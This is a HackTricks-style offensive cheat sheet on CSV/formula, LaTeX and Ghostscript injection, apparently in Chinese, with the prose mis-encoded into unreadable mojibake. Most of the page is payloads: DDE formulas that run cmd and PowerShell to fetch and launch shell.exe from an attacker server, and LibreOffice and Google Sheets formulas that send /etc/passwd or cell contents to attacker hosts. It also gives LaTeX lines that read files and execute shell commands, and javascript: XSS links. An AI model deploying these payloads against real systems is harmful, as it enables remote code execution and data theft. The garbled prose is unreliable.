# å…¬å¼/CSV/æ–‡æ¡£/LaTeX/GhostScriptæ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## å…¬å¼æ³¨å…¥

### ä¿¡æ¯

å¦‚æœæ‚¨çš„**è¾“å…¥**è¢«**åå°„**åœ¨**CSVæ–‡ä»¶**ï¼ˆæˆ–ä»»ä½•å¯èƒ½è¢«**Excel**æ‰“å¼€çš„æ–‡ä»¶ï¼‰ä¸­ï¼Œæ‚¨å¯èƒ½å¯ä»¥æ”¾ç½®Excel**å…¬å¼**ï¼Œå½“ç”¨æˆ·**æ‰“å¼€æ–‡ä»¶**æˆ–ç”¨æˆ·**åœ¨Excelè¡¨æ ¼å†…ç‚¹å‡»æŸä¸ªé“¾æ¥**æ—¶ï¼Œè¿™äº›å…¬å¼å°†è¢«**æ‰§è¡Œ**ã€‚

{% hint style="danger" %}
ç°åœ¨**Excelä¼šè­¦å‘Š**ï¼ˆå¤šæ¬¡ï¼‰ç”¨æˆ·ï¼Œå½“ä»Excelå¤–éƒ¨åŠ è½½å†…å®¹æ—¶ï¼Œä»¥é˜²æ­¢ç”¨æˆ·è¿›è¡Œæ¶æ„æ“ä½œã€‚å› æ­¤ï¼Œå¿…é¡»å¯¹ç¤¾ä¼šå·¥ç¨‹è¿›è¡Œç‰¹åˆ«åŠªåŠ›ä»¥è·å¾—æœ€ç»ˆæœ‰æ•ˆè½½è·ã€‚
{% endhint %}

### [å­—å…¸](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### è¶…é“¾æ¥

**ä»¥ä¸‹ç¤ºä¾‹éå¸¸æœ‰ç”¨ï¼Œå¯ç”¨äºä»æœ€ç»ˆçš„Excelè¡¨ä¸­çªƒå–å†…å®¹å¹¶å‘ä»»æ„ä½ç½®å‘å‡ºè¯·æ±‚ã€‚ä½†éœ€è¦ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼ˆå¹¶æ¥å—è­¦å‘Šæç¤ºï¼‰ã€‚**

ä»¥ä¸‹ç¤ºä¾‹æ‘˜è‡ª[https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

æƒ³è±¡ä¸€ä¸‹ï¼Œé€šè¿‡CSVæ³¨å…¥æ”»å‡»åˆ©ç”¨äº†å­¦ç”Ÿè®°å½•ç®¡ç†ç³»ç»Ÿä¸­çš„å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…çš„ä¸»è¦ç›®çš„æ˜¯ç ´åæ•™å¸ˆç”¨äºç®¡ç†å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯çš„ç³»ç»Ÿã€‚è¯¥æ–¹æ³•æ¶‰åŠæ”»å‡»è€…å°†æ¶æ„æœ‰æ•ˆè½½è·æ³¨å…¥åº”ç”¨ç¨‹åºä¸­ï¼Œå…·ä½“æ–¹æ³•æ˜¯åœ¨ç”¨äºå­¦ç”Ÿè¯¦ç»†ä¿¡æ¯çš„å­—æ®µä¸­è¾“å…¥æœ‰å®³å…¬å¼ã€‚æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š

1. **æ³¨å…¥æ¶æ„æœ‰æ•ˆè½½è·:**
* æ”»å‡»è€…æäº¤å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯è¡¨å•ï¼Œä½†åŒ…å«ç”µå­è¡¨æ ¼ä¸­å¸¸ç”¨çš„å…¬å¼ï¼ˆä¾‹å¦‚ï¼Œ`=HYPERLINK("<malicious_link>","Click here")`ï¼‰ã€‚
* æ­¤å…¬å¼æ—¨åœ¨åˆ›å»ºè¶…é“¾æ¥ï¼Œä½†æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„æœåŠ¡å™¨ã€‚
2. **å¯¼å‡ºå—æŸæ•°æ®:**
* æ•™å¸ˆä»¬ä¸çŸ¥é“å—åˆ°äº†å¨èƒï¼Œä½¿ç”¨åº”ç”¨ç¨‹åºçš„åŠŸèƒ½å°†æ•°æ®å¯¼å‡ºåˆ°CSVæ–‡ä»¶ä¸­ã€‚
* æ‰“å¼€CSVæ–‡ä»¶æ—¶ï¼Œä»ç„¶åŒ…å«æ¶æ„æœ‰æ•ˆè½½è·ã€‚æ­¤æœ‰æ•ˆè½½è·åœ¨ç”µå­è¡¨æ ¼ä¸­æ˜¾ç¤ºä¸ºå¯ç‚¹å‡»çš„è¶…é“¾æ¥ã€‚
3. **è§¦å‘æ”»å‡»:**
* æ•™å¸ˆç‚¹å‡»è¶…é“¾æ¥ï¼Œè®¤ä¸ºè¿™æ˜¯å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯çš„åˆæ³•éƒ¨åˆ†ã€‚
* ç‚¹å‡»åï¼Œæ•æ„Ÿæ•°æ®ï¼ˆå¯èƒ½åŒ…æ‹¬ç”µå­è¡¨æ ¼æˆ–æ•™å¸ˆè®¡ç®—æœºä¸­çš„è¯¦ç»†ä¿¡æ¯ï¼‰è¢«ä¼ è¾“åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
4. **è®°å½•æ•°æ®:**
* æ”»å‡»è€…çš„æœåŠ¡å™¨æ¥æ”¶å¹¶è®°å½•ä»æ•™å¸ˆè®¡ç®—æœºå‘é€çš„æ•æ„Ÿæ•°æ®ã€‚
* æ”»å‡»è€…éšåå¯ä»¥å°†æ­¤æ•°æ®ç”¨äºå„ç§æ¶æ„ç›®çš„ï¼Œè¿›ä¸€æ­¥å±åŠå­¦ç”Ÿå’Œæœºæ„çš„éšç§å’Œå®‰å…¨ã€‚

### RCE

**æŸ¥çœ‹** [**åŸå§‹å¸–å­**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚**

åœ¨ç‰¹å®šé…ç½®æˆ–è¾ƒæ—§ç‰ˆæœ¬çš„Excelä¸­ï¼Œç§°ä¸ºåŠ¨æ€æ•°æ®äº¤æ¢ï¼ˆDDEï¼‰çš„åŠŸèƒ½å¯ç”¨äºæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¦åˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œå¿…é¡»å¯ç”¨ä»¥ä¸‹è®¾ç½®ï¼š

* è½¬åˆ°â€œæ–‡ä»¶â€â†’â€œé€‰é¡¹â€â†’â€œä¿¡ä»»ä¸­å¿ƒâ€â†’â€œä¿¡ä»»ä¸­å¿ƒè®¾ç½®â€â†’â€œå¤–éƒ¨å†…å®¹â€ï¼Œå¹¶å¯ç”¨**åŠ¨æ€æ•°æ®äº¤æ¢æœåŠ¡å™¨å¯åŠ¨**ã€‚

å½“æ‰“å¼€åŒ…å«æ¶æ„æœ‰æ•ˆè½½è·çš„ç”µå­è¡¨æ ¼ï¼ˆå¦‚æœç”¨æˆ·æ¥å—è­¦å‘Šï¼‰æ—¶ï¼Œå°†æ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚ä¾‹å¦‚ï¼Œè¦å¯åŠ¨è®¡ç®—å™¨åº”ç”¨ç¨‹åºï¼Œæœ‰æ•ˆè½½è·å°†æ˜¯ï¼š
```markdown
`=cmd|' /C calc'!xxx`
```
é™„åŠ å‘½ä»¤ä¹Ÿå¯ä»¥è¢«æ‰§è¡Œï¼Œæ¯”å¦‚ä½¿ç”¨ PowerShell ä¸‹è½½å¹¶æ‰§è¡Œæ–‡ä»¶ï¼š
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LibreOffice Calcä¸­çš„æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰

LibreOffice Calcå¯ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶å¹¶çªƒå–æ•°æ®ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æ–¹æ³•ï¼š

* ä»æœ¬åœ° `/etc/passwd` æ–‡ä»¶ä¸­è¯»å–ç¬¬ä¸€è¡Œï¼š`='file:///etc/passwd'#$passwd.A1`
* å°†è¯»å–çš„æ•°æ®çªƒå–åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ï¼š`=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* å¤šè¡Œæ•°æ®çªƒå–ï¼š`=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNSæ•°æ®çªƒå–ï¼ˆå°†è¯»å–çš„æ•°æ®ä½œä¸ºDNSæŸ¥è¯¢å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„DNSæœåŠ¡å™¨ï¼‰ï¼š`=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>"))`

### ç”¨äºå¸¦å¤–ï¼ˆOOBï¼‰æ•°æ®çªƒå–çš„Google Sheets

Google Sheetsæä¾›å¯ç”¨äºå¸¦å¤–æ•°æ®çªƒå–çš„å‡½æ•°ï¼š

* **CONCATENATE**ï¼šå°†å­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ· - `=CONCATENATE(A2:E2)`
* **IMPORTXML**ï¼šä»ç»“æ„åŒ–æ•°æ®ç±»å‹å¯¼å…¥æ•°æ® - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**ï¼šå¯¼å…¥RSSæˆ–ATOMæº - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**ï¼šä»HTMLè¡¨æ ¼æˆ–åˆ—è¡¨å¯¼å…¥æ•°æ® - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**ï¼šä»å¦ä¸€ä¸ªç”µå­è¡¨æ ¼ä¸­å¯¼å…¥ä¸€ç³»åˆ—å•å…ƒæ ¼ - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**ï¼šå°†å›¾åƒæ’å…¥å•å…ƒæ ¼ - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

## LaTeXæ³¨å…¥

é€šå¸¸åœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°çš„å°†**LaTeXä»£ç è½¬æ¢ä¸ºPDF**çš„æœåŠ¡å™¨ä½¿ç”¨**`pdflatex`**ã€‚

è¯¥ç¨‹åºä½¿ç”¨3ä¸ªä¸»è¦å±æ€§æ¥ï¼ˆç¦æ­¢ï¼‰æ‰§è¡Œå‘½ä»¤ï¼š

* **`--no-shell-escape`**ï¼š**ç¦ç”¨** `\write18{command}` ç»“æ„ï¼Œå³ä½¿åœ¨ texmf.cnf æ–‡ä»¶ä¸­å¯ç”¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚
* **`--shell-restricted`**ï¼šä¸ `--shell-escape` ç›¸åŒï¼Œä½†ä»…é™äºä¸€ç»„â€œå®‰å…¨â€çš„**é¢„å®šä¹‰**\*\*å‘½ä»¤ï¼ˆ\*\*åœ¨Ubuntu 16.04ä¸­ï¼Œåˆ—è¡¨ä½äº `/usr/share/texmf/web2c/texmf.cnf`ï¼‰ã€‚
* **`--shell-escape`**ï¼š**å¯ç”¨** `\write18{command}` ç»“æ„ã€‚å‘½ä»¤å¯ä»¥æ˜¯ä»»ä½•shellå‘½ä»¤ã€‚å‡ºäºå®‰å…¨åŸå› ï¼Œé€šå¸¸ç¦æ­¢æ­¤ç»“æ„ã€‚

ç„¶è€Œï¼Œè¿˜æœ‰å…¶ä»–æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼Œå› æ­¤ä¸ºäº†é¿å…è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œéå¸¸é‡è¦ä½¿ç”¨ `--shell-restricted`ã€‚

### è¯»å–æ–‡ä»¶ <a href="#read-file" id="read-file"></a>

æ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨åŒ…è£…å™¨è¿›è¡Œè°ƒæ•´ï¼Œå¦‚\[æˆ–$ã€‚
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### è¯»å–å•è¡Œæ–‡ä»¶
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### è¯»å–å¤šè¡Œæ–‡ä»¶
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### å†™å…¥æ–‡ä»¶ <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### å‘½ä»¤æ‰§è¡Œ <a href="#command-execution" id="command-execution"></a>

å‘½ä»¤çš„è¾“å…¥å°†è¢«é‡å®šå‘åˆ° stdinï¼Œä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ¥è·å–å®ƒã€‚
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
å¦‚æœé‡åˆ°ä»»ä½•LaTexé”™è¯¯ï¼Œè¯·è€ƒè™‘ä½¿ç”¨base64æ¥è·å–ç»“æœï¼Œä»¥é¿å…å‡ºç°ä¸è‰¯å­—ç¬¦ã€‚
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### è·¨ç«™è„šæœ¬æ”»å‡» <a href="#cross-site-scripting" id="cross-site-scripting"></a>

æ¥è‡ª[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscriptæ³¨å…¥

**æ£€æŸ¥** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## å‚è€ƒèµ„æ–™

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
